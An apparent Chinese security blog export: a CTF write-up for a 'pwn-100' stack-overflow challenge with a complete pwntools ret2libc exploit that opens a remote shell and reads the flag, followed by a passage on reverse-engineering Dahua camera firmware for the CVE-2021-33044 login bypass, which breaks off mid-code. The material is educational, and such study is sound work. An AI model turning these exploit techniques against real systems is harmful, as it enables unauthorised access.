<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">┌──(root💀06aa46c0844f)-[/home]</span><br><span class="line">└─<span class="comment"># checksec pwn-100</span></span><br><span class="line">[*] <span class="string">&#x27;/home/pwn-100&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>main</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  sub_40068E();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_40068E，v1的空间只有0x40个字节，然而后面sub_40064D调用传入了200，疑似存在栈溢出可以利用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_40068E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line"></span><br><span class="line">  sub_40063D((__int64)&amp;v1, <span class="number">200</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;bye~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>果然，sub_40064D就是用来循环200次来覆盖v1的，<strong>必须输入200个字节，这里空行不会中断！</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_40063D</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    read(<span class="number">0</span>, (<span class="keyword">void</span> *)((<span class="keyword">signed</span> <span class="keyword">int</span>)i + a1), <span class="number">1uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是程序并没有”/bin/sh”字符串和system函数的地址，属于ret2libc</p>
<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gwxbxjzo6fj30k80qimz0.jpg" alt="image-20211130174224966"></p>
<p>但下载下来的程序并没有给libc文件，因此需要我们通过一定手段去泄露某个函数的真实地址，再去查libc版本</p>
<p>此题可以通过打印puts的真实地址，然后去查libc版本号</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>反汇编可以看出，在调用puts函数之前，会把参数传给edi（而不是压栈），因为是64位程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004006AC                 mov     edi, offset s   ; &quot;bye~&quot;</span><br><span class="line">.text:00000000004006B1                 call    _puts</span><br></pre></td></tr></table></figure>

<p>所以我们构造出来的第一个payload用来泄露puts函数的真实地址</p>
<p>payload1 = 字符填充 + 覆盖rbp + gadget上pop rdi 、ret + got表中的puts（用来作为puts打印的参数了） + plt表中puts的偏移 + start返回地址</p>
<p>这里需要说明一下为什么是start作为返回地址，因为main并不是此程序真正的开头，如果直接用main会导致栈结构发生变化</p>
<p>在通过发送payload1之后，我们获取到了puts的真实地址，然后可以根据puts的真实地址（虽然是地址随机化保护，但后三位是不变的）可以根据这个特征去查询libc版本，这里给出用LibcSearcher的方式（需要安装）</p>
<h3 id="安装LibcSearcher"><a href="#安装LibcSearcher" class="headerlink" title="安装LibcSearcher"></a>安装LibcSearcher</h3><p>在sudo权限下才行</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class="line"><span class="built_in">cd</span> LibcSearcher</span><br><span class="line">python setup.py develop</span><br></pre></td></tr></table></figure>

<p>使用方式</p>
<p>声明</p>
<p><code>from LibcSearcher import *</code></p>
<p>在获取了puts的真实地址后，可以通过<code>libc = LibcSearcher(&quot;puts&quot;, puts_leak)</code>来获取可能的libc版本，如运行后：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[+] puts_leak:0x7fcbb887a690</span><br><span class="line">Multi Results:</span><br><span class="line"> 0: archive-old-glibc (id libc6-amd64_2.24-9ubuntu2_i386)</span><br><span class="line"> 1: archive-old-glibc (id libc6-amd64_2.24-3ubuntu1_i386)</span><br><span class="line"> 2: archive-old-glibc (id libc6-amd64_2.24-3ubuntu2.2_i386)</span><br><span class="line"> 3: ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)</span><br><span class="line"> 4: archive-old-glibc (id libc6-amd64_2.24-9ubuntu2.2_i386)</span><br><span class="line">Please supply more info using </span><br><span class="line">    add_condition(leaked_func, leaked_address).</span><br><span class="line">You can choose it by hand</span><br><span class="line">Or <span class="built_in">type</span> <span class="string">&#x27;exit&#x27;</span> to quit:3</span><br><span class="line">[+] ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64) be choosed.</span><br></pre></td></tr></table></figure>

<p>在上面确定了libc版本后，可以通过<code>libc.dump(&quot;system&quot;)</code>获取libc中的函数地址</p>
<p>通过<code>libc.dump(&quot;str_bin_sh&quot;)</code>获取”/bin/sh”的地址</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    r = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">50713</span>)</span><br><span class="line">    elf = ELF(<span class="string">&quot;./pwn-100&quot;</span>)</span><br><span class="line">    puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    pop_rdi_ret = <span class="number">0x400763</span></span><br><span class="line">    start_addr = <span class="number">0x400550</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#泄露puts的真实地址</span></span><br><span class="line">    payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">    payload1 = payload1.ljust(<span class="number">200</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    r.send(payload1)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">    puts_leak = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.success(<span class="string">&quot;puts_leak:&quot;</span> + <span class="built_in">hex</span>(puts_leak))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#找出libc、计算基地址</span></span><br><span class="line">    libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_leak)</span><br><span class="line">    libc_base = puts_leak - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#计算出system、bin_sh的实际地址</span></span><br><span class="line">    system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">    sh_addr = libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>) + libc_base</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#Attack</span></span><br><span class="line">    payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr)</span><br><span class="line">    payload2 = payload2.ljust(<span class="number">200</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    r.send(payload2)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>

<p>打通！</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    <span class="string">&#x27;ls\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x24 bytes:</span><br><span class="line">    <span class="string">&#x27;bin\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;dev\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;flag\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;lib\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;lib32\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;lib64\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;pwn100\n&#x27;</span></span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">pwn100</span><br><span class="line">$ cat flag</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    <span class="string">&#x27;cat flag\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x2d bytes:</span><br><span class="line">    <span class="string">&#x27;cyberpeace&#123;7567cb998ece8cb0b985c0c80431e93d&#125;\n&#x27;</span></span><br><span class="line">cyberpeace&#123;7567cb998ece8cb0b985c0c80431e93d&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>







]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>ROP</tag>
        <tag>ret2libc</tag>
      </tags>
  </entry>
  <entry>
    <title>大华摄像头-CVE-2021-33044漏洞研究</title>
    <url>/2021/10/21/%E5%A4%A7%E5%8D%8E%E6%91%84%E5%83%8F%E5%A4%B4-CVE-2021-33044%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<h3 id="大华摄像头-CVE-2021-33044漏洞研究"><a href="#大华摄像头-CVE-2021-33044漏洞研究" class="headerlink" title="大华摄像头-CVE-2021-33044漏洞研究"></a>大华摄像头-CVE-2021-33044漏洞研究</h3><p>固件下载地址：<a href="https://www.dahuasecurity.com/support/downloadCenter/firmware">Firmwares (dahuasecurity.com)</a></p>
<p>下载固件的时候，提及一下这几种类别：</p>
<p>1、IPC：IPC即IP-CAMERA，是集成视频服务器和摄像机的功能为一体的数字视频设备；IP-CAMERA网络摄像机一般有内置Web服务的数字摄像机和录音设备，直接与以太网（有线、无线）相连。用户可通过标准Web浏览器观看和收听网络摄像机传送过来的视频和声音。</p>
<p>2、视频服务器（DVS）：采用数字压缩算法，实现音视频信息的数字压缩和网络传输与控制设备。视频服务器一般为嵌入式视频服务器设备，采用嵌入式CPU的硬件设计，体积小，结构方便，一般有为1路、2路和4路音视频输入，有些可以实现双向对讲功能。目前有些DVS设备也可以内置小容量的硬盘。</p>
<p>3、数字视频录像机（DVR）：　DVR即是Digital Video Recorder,数字视频录像机或数字硬盘录像机，我们习惯上称为硬盘录像机。结合标准接口的数字存储介质，采用数字压缩算法，实现音视频信息的数字记录、监视与回放，并可带有系统控制功能的视频设备或视频网络传输与监控的设备（一般带有独有的功能操控面板）。目前韩国、台湾的DVR产品在全球市场上占有很高的市场份额，有PC工控机式的，也有嵌入式的，高路数方面PC的多以些，低路数上嵌入式的多一些。韩国以PC为主，台湾以低路数的嵌入式为主。中国大陆的DVR也有PC式和嵌入式的。以前的DVR是不带联网功能的，以本地监控为主。根据用户的要求和技术的发展，目前不少厂家的DVR设备也具有了联网能力，根据用户的要求，带联网功能的DVR一般在本地观看和存储的是D1格式的图像，上传到中心的图像是CIF格式的。一般DVR输入不超过16路，尽量不要让DVR同时工作在不间断录像和网络传输应用之中。</p>
<p>4、网络数字硬盘录像机（NVR）：NVR即是Network Video Recorder，网络数字硬盘录像机，与DVR的不同点在于，DVR前端是接模拟摄像头，而NVR前端是接网络摄像头；在图像压缩传输方面，NVR比DVR要清晰的多，可以达到高清，信号传输也比DVR流畅；有些NVR也兼容DVR的功能。</p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/2ZoAFe3IauWwtbq-20230520104704766.png" alt="image-20211015110352756"></p>
<p>选择IPC，2021年6月份之前的（后面才知道官网已经下架旧固件的下载地址了，我这里是先找的修复过的固件，看看）</p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/zyIvFWn1KigESXP-20230520104704787.png" alt="image-20211012102225244"></p>
<p>对web-x.squashfs.bin提取</p>
<p><code>binwalk -Me web-x.squashfs.bin</code></p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/hZQBVeuoc5A1JwO-20230520104705871.png" alt="image-20211012155634680"></p>
<p>对下面列表得文件进行逆向分析</p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/poiZE9gbS84sP1I-20230520104704782.png" alt="image-20211012160057872"></p>
<p>因为我也是第一次接触js，看js的代码，不太了解web开发，所以全部看我肯定更懵了，我就按照CVE所说的clientType有问题，直接搜索clientType，发现只有三个文件是带有这个字符串的</p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/f3CFB9mSPquclTJ-20230520104704776.png" alt="image-20211013095730155"></p>
<p>打开是没有代码格式化的，非常乱，我们需要做一下代码格式化再分析</p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/7PRwbZYV9U8yETg-20230520104704775.png" alt="image-20211013095816712"></p>
<p>我们用网站的工具进行解码：<a href="https://www.gjk.cn/js">Javascript在线解压缩_js加密解密混淆 (gjk.cn)</a>，将代码格式化</p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/84IhjGBi7NpxOzg-20230520104705018.png" alt="image-20211013095938618"></p>
<p>下面这个就是POC所说的Global.login啦，但是发现这里并没有验证，毕竟是前端，只是用一个结构体去存储用户的登录信息，说明验证登录信息的应该在后端，所以这里面应该是没有，但是我们接下来的思路应该是去找谁调用了这个函数（global.login）或者说是这个结构体变量会在后端哪出现，然后看它是如何做验证的</p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/qLxQhwPTjE49JMf-20230520104705106.png" alt="image-20211013104946480"></p>
<p>下载下来的固件还有另一个我没有去提取，上面的是关于web的，所以接下来我尝试去binwalk另外一个</p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/983mWadKb726Ynj-20230520104705004.png" alt="image-20211013110047649"></p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/BEoYyz8jLfdnICr-20230520104705551.png" alt="image-20211013110004906"></p>
<p>提取结果</p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/qEiTc2N1dg7aw8V-20230520104705049.png" alt="image-20211013113542185"></p>
<p>用grep命令去找global.login，发现有两个二进制文件，aolDaemon和sonia</p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/45vZwGHXfIYFujN-20230520104705289.png" alt="image-20211013155529302"></p>
<p>分析sonia放入ida中分析，在字符串里面搜索global.login，修复过的固件版本NetKeyboard是搜索不到的</p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/4ok1btelnMuCaxR-20230520104705615.png" alt="image-20211013160059638"></p>
<p>找到调用global.login函数的地址</p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/hVGmkWjJQ9FcPRU-20230520104705818.png" alt="image-20211013160157054"></p>
<p>这里发现，clientType直接被赋值为了CGI，没有让用户有输入修改clientType的机会，此固件的确已经修复了clientType</p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/qp12zlXbIDMLOWe-20230520104705377.png"></p>
<p>真正的分析开始：从<a href="https://files.dahua.support/Firmware/Kamery%20-IP-%20sta%C5%82opozycyjne/EcoSavvy3.0%20%28Pro%29/Stare/?MA%E4%B8%8A%E4%B8%8B%E8%BD%BD%E4%BA%86%E4%B8%80%E4%B8%AA%E6%97%A7%E7%9A%84%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90QAQ">https://files.dahua.support/Firmware/Kamery%20-IP-%20sta%C5%82opozycyjne/EcoSavvy3.0%20%28Pro%29/Stare/?MA上下载了一个旧的固件进行分析QAQ</a></p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/nwiypV59B6lHSbk-20230520104705584.png" alt="image-20211014180226040"></p>
<p>按照前面的套路，binwalk解包，这次能直接搜到NetKeyboard了，并且也是在sonia中</p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/gfAxQ7dVpDWnUOj-20230520104705590.png" alt="image-20211014200605920"></p>
<p>找到global.login的位置，对sonia逆向分析</p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/cu1HQh6VCixGNq5-20230520104705610.png" alt="image-20211015111013597"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_150330</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  v5 = (<span class="keyword">unsigned</span> __int8 *)sub_5D88E0(a3, (<span class="keyword">int</span>)<span class="string">&quot;method&quot;</span>);	</span><br><span class="line">  sub_5D77CA((<span class="keyword">int</span>)v37, (<span class="keyword">int</span>)<span class="string">&quot;global.login&quot;</span>);</span><br><span class="line">  sub_5D8386(v5, (<span class="keyword">unsigned</span> __int8 *)v37);</span><br><span class="line">  sub_5D7EF2(v37, v6);</span><br><span class="line">  v7 = sub_5D88E0(a3, (<span class="keyword">int</span>)<span class="string">&quot;params&quot;</span>);</span><br><span class="line">  v8 = (<span class="keyword">unsigned</span> __int8 *)sub_5D88E0(v7, (<span class="keyword">int</span>)<span class="string">&quot;userName&quot;</span>);</span><br><span class="line">  v9 = sub_5D7F94(a2, (<span class="keyword">int</span>)<span class="string">&quot;userName&quot;</span>);</span><br><span class="line">  sub_5D7918(v37, v9);</span><br><span class="line">  sub_5D7876(v36, v37);</span><br><span class="line">  sub_5D8386(v8, (<span class="keyword">unsigned</span> __int8 *)v36);</span><br><span class="line">  sub_5D7EF2(v36, v10);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v37);</span><br><span class="line">  v11 = sub_5D88E0(a3, (<span class="keyword">int</span>)<span class="string">&quot;params&quot;</span>);</span><br><span class="line">  v12 = (<span class="keyword">unsigned</span> __int8 *)sub_5D88E0(v11, (<span class="keyword">int</span>)<span class="string">&quot;password&quot;</span>);</span><br><span class="line">  v13 = sub_5D7F94(a2, (<span class="keyword">int</span>)<span class="string">&quot;password&quot;</span>);</span><br><span class="line">  sub_5D7918(v37, v13);</span><br><span class="line">  sub_5D7876(v36, v37);</span><br><span class="line">  sub_5D8386(v12, (<span class="keyword">unsigned</span> __int8 *)v36);</span><br><span class="line">  sub_5D7EF2(v36, v14);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v37);</span><br><span class="line">  <span class="keyword">if</span> ( sub_5D806C(a2, (<span class="keyword">int</span>)<span class="string">&quot;clientType&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v15 = sub_5D7F94(a2, (<span class="keyword">int</span>)<span class="string">&quot;clientType&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sub_5D7C86((<span class="keyword">int</span>)v15) )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = sub_5D88E0(a3, (<span class="keyword">int</span>)<span class="string">&quot;params&quot;</span>);</span><br><span class="line">      v17 = (<span class="keyword">unsigned</span> __int8 *)sub_5D88E0(v16, (<span class="keyword">int</span>)<span class="string">&quot;clientType&quot;</span>);</span><br><span class="line">      v18 = sub_5D7F94(a2, (<span class="keyword">int</span>)<span class="string">&quot;clientType&quot;</span>);</span><br><span class="line">      sub_5D7918(v37, v18);</span><br><span class="line">      sub_5D7876(v36, v37);</span><br><span class="line">      sub_5D8386(v17, (<span class="keyword">unsigned</span> __int8 *)v36);</span><br><span class="line">      sub_5D7EF2(v36, v19);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v37);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_5D806C(a2, (<span class="keyword">int</span>)<span class="string">&quot;authorityType&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = sub_5D7F94(a2, (<span class="keyword">int</span>)<span class="string">&quot;authorityType&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sub_5D7C86((<span class="keyword">int</span>)v20) )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = sub_5D88E0(a3, (<span class="keyword">int</span>)<span class="string">&quot;params&quot;</span>);</span><br><span class="line">      v22 = (<span class="keyword">unsigned</span> __int8 *)sub_5D88E0(v21, (<span class="keyword">int</span>)<span class="string">&quot;authorityType&quot;</span>);</span><br><span class="line">      v23 = sub_5D7F94(a2, (<span class="keyword">int</span>)<span class="string">&quot;authorityType&quot;</span>);</span><br><span class="line">      sub_5D7918(v37, v23);</span><br><span class="line">      sub_5D7876(v36, v37);</span><br><span class="line">      sub_5D8386(v22, (<span class="keyword">unsigned</span> __int8 *)v36);</span><br><span class="line">      sub_5D7EF2(v36, v24);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v37);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_5D806C(a2, (<span class="keyword">int</span>)<span class="string">&quot;passwordType&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v25 = sub_5D7F94(a2, (<span class="keyword">int</span>)<span class="string">&quot;passwordType&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sub_5D7C86((<span class="keyword">int</span>)v25) )</span><br><span class="line">    &#123;</span><br><span class="line">      v26 = sub_5D88E0(a3, (<span class="keyword">int</span>)<span class="string">&quot;params&quot;</span>);</span><br><span class="line">      v27 = (<span class="keyword">unsigned</span> __int8 *)sub_5D88E0(v26, (<span class="keyword">int</span>)<span class="string">&quot;passwordType&quot;</span>);</span><br><span class="line">      v28 = sub_5D7F94(a2, (<span class="keyword">int</span>)<span class="string">&quot;passwordType&quot;</span>);</span><br><span class="line">      sub_5D7918(v37, v28);</span><br><span class="line">      sub_5D7876(v36, v37);</span><br><span class="line">      sub_5D8386(v27, (<span class="keyword">unsigned</span> __int8 *)v36);</span><br><span class="line">      sub_5D7EF2(v36, v29);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v37);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_5D806C(a2, (<span class="keyword">int</span>)<span class="string">&quot;clientAddress&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v30 = sub_5D7F94(a2, (<span class="keyword">int</span>)<span class="string">&quot;clientAddress&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sub_5D7C86((<span class="keyword">int</span>)v30) )</span><br><span class="line">    &#123;</span><br><span class="line">      v31 = sub_5D88E0(a3, (<span class="keyword">int</span>)<span class="string">&quot;params&quot;</span>);</span><br><span class="line">      v32 = (<span class="keyword">unsigned</span> __int8 *)sub_5D88E0(v31, (<span class="keyword">int</span>)<span class="string">&quot;ipAddr&quot;</span>);</span><br><span class="line">      v33 = sub_5D7F94(a2, (<span class="keyword">int</span>)<span class="string">&quot;clientAddress&quot;</span>);</span><br><span class="line">      sub_5D7918(v37, v33);</span><br><span class="line">      sub_5D7876(v36, v37);</span><br><span class="line">      sub_5D8386(v32, (<span class="keyword">unsigned</span> __int8 *)v36);</span><br><span class="line">      sub_5D7EF2(v36, v34);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v37);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接搜索NetKeyboard分析</p>
<p><img src="https://re1own.github.io/assets/img/Dahua_CVE-2021-33044/ypFsZVuP3AaNqgU-20230520104705888.png" alt="image-20211015113309952"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_14149E</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> ......</span><br><span class="line">    <span class="keyword">if</span> ( v18 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_assign(v39, v18 + <span class="number">8</span>);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(v47, v19 + <span class="number">32</span>);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_assign(v41, v47);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v47);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(v48, v19 + <span class="number">84</span>);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_assign(v43, v48);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::_M_dispose(v48);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;&gt;::basic_string(v49, v19 + <span class="number">108</span>);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;,<span 